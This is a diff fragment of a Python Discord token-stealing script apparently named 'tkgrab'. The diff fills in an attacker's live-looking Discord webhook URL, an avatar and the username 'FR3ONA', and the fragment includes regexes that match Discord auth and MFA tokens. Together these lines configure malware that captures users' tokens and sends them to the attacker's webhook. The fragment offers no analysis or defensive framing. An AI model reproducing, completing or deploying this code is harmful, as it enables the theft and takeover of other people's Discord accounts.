@@ -9,9 +9,9 @@ import json
 import platform
 import requests
 
-WEBHOOK_URL = "url here"
-WEBHOOK_AVATAR = "your avatar"
-WEBHOOK_USERNAME = "tkgrab"
+WEBHOOK_URL = "https://discord.com/api/webhooks/978096023761207346/9IDExlivgqcb39AeXgTgBAfKBhgAJ4d7Rz0bKkfDWoA-7ztlhYE2E9PPg-qJsSWcKb8A"
+WEBHOOK_AVATAR = "https://cdn.discordapp.com/avatars/766430187897487371/9c0df8654fdfcce696a9c0c83c3611e2.png?size=4096"
+WEBHOOK_USERNAME = "FR3ONA"
 
 TOKENGRAB_REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'
 
